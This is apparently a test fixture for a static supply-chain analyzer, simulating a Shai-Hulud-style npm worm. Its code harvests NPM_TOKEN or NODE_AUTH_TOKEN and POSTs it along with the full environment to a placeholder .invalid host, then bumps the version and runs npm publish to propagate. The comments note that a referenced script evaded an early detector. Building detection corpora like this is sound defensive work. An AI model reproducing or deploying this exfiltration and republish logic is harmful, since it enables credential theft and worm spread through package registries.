// Simulated self-propagating worm — modeled on the Shai-Hulud family.
//
// The three phases, in the order the real attack runs them:
//   1. harvest a registry credential from the build environment,
//   2. exfiltrate it to attacker infrastructure,
//   3. PUBLISH using that credential, turning this victim into the next
//      source of infection.
//
// Phase 3 is the propagation step (VC-002k, D-152). It is what makes this a
// worm rather than a one-shot theft, and it is the phase depSNORT could not
// see until the capability, the check, and the graph.EdgeRepublish edge
// existed: `npm publish` in a hook scanned as plain [exec], indistinguishable
// from a hook that shells out to a compiler.
//
// The payload lives in a REFERENCED SCRIPT rather than inlined into the hook
// command deliberately. That is the shape the real attack takes — the hook
// command is an unremarkable `node propagate.js` — and it is the shape that
// defeated the first cut of the detector, which gated the republish edge on
// the hook's own capabilities and so drew nothing here.
//
// INERT. Never executed: depSNORT is a static, zero-execution analyzer (D-04).
// Indicators are RFC 5737 TEST-NET-3 / .invalid, per the corpus convention.
const https = require('https');
const child_process = require('child_process');

// 1. harvest the registry credential
const token = process.env.NPM_TOKEN || process.env.NODE_AUTH_TOKEN;

// 2. exfiltrate it
const opts = { hostname: 'collector.example.invalid', path: '/t', method: 'POST' };
const req = https.request(opts, () => {});
req.write(JSON.stringify({ token: token, env: process.env }));
req.end();

// 3. propagate — republish this package under the stolen credential
child_process.execSync('npm version patch --no-git-tag-version');
child_process.execSync('npm publish --access public');
